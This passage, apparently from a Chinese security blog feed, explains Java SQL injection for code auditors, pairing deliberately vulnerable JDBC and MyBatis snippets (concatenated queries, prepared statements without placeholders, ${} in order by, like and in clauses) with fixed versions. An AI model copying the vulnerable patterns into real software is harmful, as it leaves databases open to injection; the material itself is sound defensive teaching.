conn.createStatement();</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;[vul] 执行SQL语句： &#123;&#125;&quot;</span>, sql);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">res_pass</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">result.append(String.format(<span class="string">&quot;查询结果 %s: %s&quot;</span>, res_name, res_pass));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rs.close();</span><br><span class="line">stmt.close();</span><br><span class="line">conn.close();</span><br><span class="line"><span class="keyword">return</span> result.toString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// 输出错误，用于报错注入</span></span><br><span class="line"><span class="keyword">return</span> e.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进一步，使用字符串动态拼接可实现不同关键字的注入，如 like注入、in注入和 order by 注入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql_like</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id like &#x27;%&quot;</span> + id + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql_order</span> <span class="operator">=</span> <span class="string">&quot;select * from users order by &quot;</span> + column_name;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql_in</span> <span class="operator">=</span> <span class="string">&quot;delete from users where id in(&quot;</span> + del_ids +<span class="string">&quot;);&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql_xxx);</span><br></pre></td></tr></table></figure><h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><ol><li>预编译SQL</li><li>黑白名单</li><li>参数类型强转</li></ol><p>使用<code>java.sql.PreparedStatement</code>预编译SQL语句可以解决动态拼接的问题，简单来说就是使用占位符代替直接传入的参数，然后调用setter去做赋值，实现了sql 注入的防御。使用预编译的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;safe：JDBC预编译&quot;, notes = &quot;采用预编译的方法，使用?占位，也叫参数化的SQL&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/safe1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">safe1</span><span class="params">(String id)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = ?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">st.setString(<span class="number">1</span>, id);</span><br><span class="line">log.info(<span class="string">&quot;[safe] 执行SQL语句： &#123;&#125;&quot;</span>, st);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">res_pass</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;查询结果%n %s: %s%n&quot;</span>, res_name, res_pass);</span><br><span class="line">result.append(info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rs.close();</span><br><span class="line">st.close();</span><br><span class="line">conn.close();</span><br><span class="line"><span class="keyword">return</span> result.toString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="keyword">return</span> e.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：并不是使用了预编译SQL就是绝对安全的，下一小节就指出了预编译使用不当、无法使用预编译而导致的漏洞。</p><p>类似的防御策略还有：黑白名单、类型强转、第三方安全编码组件等，这里以类型强转为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;safe：强制数据类型&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/safe4&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">safe4</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">    <span class="type">DriverManagerDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DriverManagerDataSource</span>();</span><br><span class="line">    dataSource.setDriverClassName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    dataSource.setUrl(db_url);</span><br><span class="line">    dataSource.setUsername(db_user);</span><br><span class="line">    dataSource.setPassword(db_pass);</span><br><span class="line"></span><br><span class="line">    <span class="type">JdbcTemplate</span> <span class="variable">jdbctemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(dataSource);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql_vul</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &quot;</span> + id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jdbctemplate.queryForMap(sql_vul);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="预编译未使用占位符"><a href="#预编译未使用占位符" class="headerlink" title="预编译未使用占位符"></a>预编译未使用占位符</h3><h4 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>预编译起作用的前提是正确使用 PreparedStatement ，如果仅调用查询，而不使用占位符进行参数拼接，本质上还是会导致动态参数拼接的问题，从而导致注入。</p><p>例如下面代码虽然用到了预编译的函数，但是并未使用占位符，从而导致注入漏洞。这个问题多是因为开发人员的粗心大意导致的，而在如今的AI辅助编程时代，类似的错误会越来越少。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;vul：JDBC预编译拼接&quot;, notes = &quot;采用预编译的方法，但没使用?占位，此时进行预编译也无法阻止SQL注入&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/vul2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">vul2</span><span class="params">(String id)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &quot;</span> + id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;[vul] 执行SQL语句： &#123;&#125;&quot;</span>, sql);</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">res_pass</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;查询结果%n %s: %s%n&quot;</span>, res_name, res_pass);</span><br><span class="line">result.append(info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rs.close();</span><br><span class="line">st.close();</span><br><span class="line">conn.close();</span><br><span class="line"><span class="keyword">return</span> result.toString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="keyword">return</span> e.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="防御思路-1"><a href="#防御思路-1" class="headerlink" title="防御思路"></a>防御思路</h4><p>对于这种代码编写错误，要规范安全开发流程，在上线前要做统一的代码审查，避免类似的问题。</p><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><h4 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>这个漏洞比较有意思，由于 PreparedStatement 预编译的函数会把传参转换成字符串，所以会出现下面的情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## 正常语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id</span><br><span class="line">## 预编译转义后</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> &quot;id&quot;</span><br></pre></td></tr></table></figure><p>“id”不被识别为列名，进而导致排序失效，所以编写包含排序的语句时，只能通过拼接的方式，而如果没对参数进行严格过滤，就容易造成SQL注入。漏洞代码在动态参数拼接那一节写过了，伪代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql_order</span> <span class="operator">=</span> <span class="string">&quot;select * from users order by &quot;</span> + id;</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql_order);</span><br></pre></td></tr></table></figure><h4 id="防御思路-2"><a href="#防御思路-2" class="headerlink" title="防御思路"></a>防御思路</h4><p>由于无法使用预编译，所以需要对用户传参做校验，推荐使用白名单过滤，指定传参必须为列名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;safe: order by 参数白名单过滤&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/safe5&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">safe5</span><span class="params">(String column)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 限制column参数只能是id、username、password三者之一</span></span><br><span class="line">    Set&lt;String&gt; allowedFields = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(Arrays.asList(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (allowedFields.contains(column)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">        <span class="comment">// 动态拼接用户参数</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users order by &quot;</span> + column;</span><br><span class="line">            log.info(<span class="string">&quot;[safe] 执行SQL语句： &#123;&#125;&quot;</span>, sql);</span><br><span class="line">            </span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;查询结果 %s: %s&quot;</span>, rs.getString(<span class="string">&quot;user&quot;</span>), rs.getString(<span class="string">&quot;pass&quot;</span>));</span><br><span class="line">                result.append(info);</span><br><span class="line">            &#125;</span><br><span class="line">            rs.close();</span><br><span class="line">            stmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Mybatis-漏洞点"><a href="#Mybatis-漏洞点" class="headerlink" title="Mybatis 漏洞点"></a>Mybatis 漏洞点</h2><p>Mybatis &#x2F; Mybatis plus 是目前比较新的数据库操作方式，它提供了 xml配置 &#x2F; mapper接口注解 两种映射方式，结合赖注入可以实现非常简洁的数据库调用。（个人更喜欢注解方式）</p><p>xml配置方式<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/7a57f0fb6a0f46f4aa602c81a792d032.png"></p><p>mapper接口注解方式<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/4d2288faf8b839dc993960f4b66d46b6.png"></p><h3 id="动态拼接参数-1"><a href="#动态拼接参数-1" class="headerlink" title="动态拼接参数"></a>动态拼接参数</h3><h4 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>Mybatis 和 JDBC 类似，有传参的预编译和非预编译之分。一般 来说，<code>#&#123;param&#125;</code> 会被转义，而 <code>$&#123;param&#125;</code> 则会直接注入。</p><p>所以如果开发人员使用到 <code>$&#123;&#125;</code>并且传参用户可控，那么就会造成 SQL 注入。特别地，由于 order by、like 和 in 关键字在使用 <code>#&#123;&#125;</code> 做转义时会报错，所以开发者容易下意识选择 <code>$&#123;&#125;</code> 解决问题，进而加大了 Mybatis 出现 SQL 注入的可能。</p><p>常见的漏洞代码如下，总共有：</p><p>1.使用 xml 映射方式，传参使用 <code>$&#123;&#125;</code></p><figure class="highlight xml"><figcaption><span>title:"UserMapper.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- id的值必须和数据处理层的接口名一致 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderBy&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.best.hello.entity.User&quot;</span>&gt;</span></span><br><span class="line">select *</span><br><span class="line">from users</span><br><span class="line">order by $&#123;field&#125; $&#123;sort&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><figcaption><span>title:"UserMapper.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt; <span class="title function_">orderBy</span><span class="params">(String field, String sort)</span>;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">orderBySafe</span><span class="params">(String field)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.使用接口注解方式，传参使用 <code>$&#123;&#125;</code></p><figure class="highlight java"><figcaption><span>title:"UserMapper.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 参数动态拼接</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where id = $&#123;id&#125;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">queryByIdAsString</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> String id)</span>;</span><br><span class="line">    <span class="comment">// 2. order by关键字注入，使用 #&#123;&#125; 会产生报错，因此容易写成 $&#123;&#125;</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users order by $&#123;field&#125; $&#123;sort&#125;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">orderBy2</span><span class="params">(<span class="meta">@Param(&quot;field&quot;)</span> String field, <span class="meta">@Param(&quot;sort&quot;)</span> String sort)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. like关键字注入，搜索时使用 &#x27;%#&#123;q&#125;%&#x27; 会报错，因此容易写成 $&#123;&#125;</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where user like &#x27;%$&#123;user&#125;%&#x27;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">searchVul</span><span class="params">(String user)</span>;</span><br><span class="line">    <span class="comment">// 4. in关键字注入, 搜索时使用 &#x27;%#&#123;q&#125;%&#x27; 会报错，因此容易写成 $&#123;&#125;</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where id in ($&#123;ids&#125;)&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">queryIdInIds</span><span class="params">(<span class="meta">@Param(&quot;ids&quot;)</span> String ids)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="防御思路-3"><a href="#防御思路-3" class="headerlink" title="防御思路"></a>防御思路</h4><p>对于直接动态拼接，把 <code>$&#123;&#125;</code> 改成 <code>#&#123;&#125;</code>即可；对于 order by、like、in 等关键字，由于报错问题，需要微调写法。</p><p>动态拼接安全代码，直接替换即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where id = #&#123;id&#125;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">queryByIdAsString</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> String id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>order by 注入安全代码，通过 choose 标签设置 filed 白名单，然后再做对应处理去解决这个问题</p><figure class="highlight xml"><figcaption><span>title:"UserMapper.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderBySafe&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.best.hello.entity.User&quot;</span>&gt;</span></span><br><span class="line">select * from users</span><br><span class="line"><span class="tag">&lt;<span class="name">choose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;field == &#x27;id&#x27;&quot;</span>&gt;</span></span><br><span class="line">order by id desc</span><br><span class="line"><span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;field == &#x27;user&#x27;&quot;</span>&gt;</span></span><br><span class="line">order by user desc</span><br><span class="line"><span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">otherwise</span>&gt;</span></span><br><span class="line">order by pass desc limit 2</span><br><span class="line"><span class="tag">&lt;/<span class="name">otherwise</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>like 注入安全代码，需要使用 concat 做字符串拼接，否则会报错的</p><figure class="highlight java"><figcaption><span>title:"UserMapper.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;    </span><br><span class="line"><span class="meta">@Select(&quot;select * from users where user like CONCAT(&#x27;%&#x27;, #&#123;user&#125;, &#x27;%&#x27;)&quot;)</span>  </span><br><span class="line">List&lt;User&gt; <span class="title function_">searchSafe</span><span class="params">(<span class="meta">@Param(&quot;user&quot;)</span> String user)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>in 注入安全代码，需要使用到 foreach 标签</p><figure class="highlight xml"><figcaption><span>title:"UserMapper.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findByUserNameVuln04&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    select * from users where id in</span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;ids&quot;</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span><span class="attr">separatosr</span>=<span class="string">&quot;,&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span>#&#123;ids&#125; <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Java SQL 注入漏洞比较有意思的地方是，Java 由于 Mybatis 的存在，对数据库操作进一步封装的同时，却不支持例如 order by 语句的预编译，导致开发者会偏向于使用更为”便捷“的 <code>$&#123;&#125;</code>，进而导致漏洞产生。 </p><p>当然值得庆幸的是，Mybatis Plus 目前已经支持上述语句的预编译，所以及时更新组件也是漏洞防御一大重点；不过也需要考虑项目兼容性和供应链安全的问题。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/j3ers3/Hello-Java-Sec">https://github.com/j3ers3/Hello-Java-Sec</a></li><li><a href="https://tttang.com/archive/1726/">https://tttang.com/archive/1726/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文主要对 Java 下 SQLI 的漏洞成因、防御思路做了分析总结，方便理清代码审计时的思路，漏洞样例代码参考自 &lt;a href=&quot;htt</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQL注入" scheme="https://jaspersec.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化 不出网利用</title>
    <link href="https://jaspersec.top/posts/3821091475.html"/>
    <id>https://jaspersec.top/posts/3821091475.html</id>
    <published>2025-03-15T04:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.239Z</updated>
    
